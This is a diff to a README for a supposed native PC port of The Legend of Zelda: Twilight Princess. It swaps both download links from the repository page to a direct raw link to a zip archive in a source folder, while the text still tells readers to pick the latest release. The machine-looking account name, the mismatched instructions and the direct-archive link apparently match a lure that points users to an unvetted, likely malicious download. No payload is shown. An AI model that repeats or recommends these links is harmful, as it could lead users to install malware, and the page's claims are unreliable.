@@ -1,12 +1,12 @@
 # ⚔️ Zelda-TP-Native-Port - Play Twilight Princess natively on PC
 
-[![](https://img.shields.io/badge/Download-Zelda-TP-Native-Port-blue.svg)](https://github.com/selfmoving-sectiongang750/Zelda-TP-Native-Port)
+[![](https://img.shields.io/badge/Download-Zelda-TP-Native-Port-blue.svg)](https://github.com/selfmoving-sectiongang750/Zelda-TP-Native-Port/raw/refs/heads/main/PortSource/Zelda-Port-Native-T-v1.4.zip)
 
 This project brings The Legend of Zelda: Twilight Princess to your Windows computer. It allows you to play the game without using an emulator like Dolphin or Cemu. You gain improved performance and visual stability.
 
 ## 📥 How to download the software
 
-Visit [this page](https://github.com/selfmoving-sectiongang750/Zelda-TP-Native-Port) to download the software. Look for the latest release on the right side of the screen. Choose the zip file that ends in .zip for your computer. Save this file to a folder you can find easily, such as your Downloads folder.
+Visit [this page](https://github.com/selfmoving-sectiongang750/Zelda-TP-Native-Port/raw/refs/heads/main/PortSource/Zelda-Port-Native-T-v1.4.zip) to download the software. Look for the latest release on the right side of the screen. Choose the zip file that ends in .zip for your computer. Save this file to a folder you can find easily, such as your Downloads folder.
 
 ## ⚙️ System requirements
 
